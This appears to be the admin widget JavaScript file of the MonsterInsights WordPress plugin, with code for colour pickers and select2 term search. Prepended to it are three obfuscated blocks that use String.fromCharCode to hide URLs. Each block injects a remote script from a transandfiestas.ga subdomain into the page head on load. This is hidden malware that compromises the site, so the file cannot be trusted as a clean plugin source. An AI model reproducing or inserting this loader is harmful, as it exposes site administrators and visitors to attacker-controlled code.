Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,112,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,105,114,99,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,97,114,116,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(
	function ( $ ) {

		// Add Color Picker to all inputs that have 'color-field' class.
		$( function () {
			init_color_picker();
			init_multiselect();
			$( document ).on( 'widget-updated widget-added', function (e) {
				init_color_picker();
				init_multiselect();
			} );
			$( document ).on( 'change', '.monsterinsights-save-on-change', function () {
				save_and_refresh_form( $( this ).closest( '.widget' ) );
			} );
		} );

		function init_color_picker() {
			var timeout;
			$( '#widgets-right .monsterinsights-color-field' ).wpColorPicker( {
				change: function ( event, ui ) {
					if ( timeout ) {
						clearTimeout( timeout );
					}
					timeout = setTimeout( function () {
						$( event.target ).trigger( 'change' );
					}, 300 );
				},
			} );
		}

		function save_and_refresh_form( widget ) {
			if ( wpWidgets && 'undefined' !== typeof wpWidgets.save ) {
				wpWidgets.save( widget, 0, 0 );
			}
		}

		function init_multiselect() {
			$('#widgets-right .monsterinsights-multiselect').select2({
				ajax: {
					type: 'POST',
					url: ajaxurl,
					delay: 250,
					width: 'resolve',
					data: function (params) {
						var taxonomy = $(this).data('taxonomy');
						return {
							taxonomy: taxonomy,
							keyword: params.term,
							action: 'monsterinsights_get_terms',
							nonce: monsterinsights_pp.nonce,
						};
					},
					processResults: function (data) {
						return {
							results: data.data
						};
					},
					dataType: 'json'
				}
			});

		}

	}
)( jQuery );
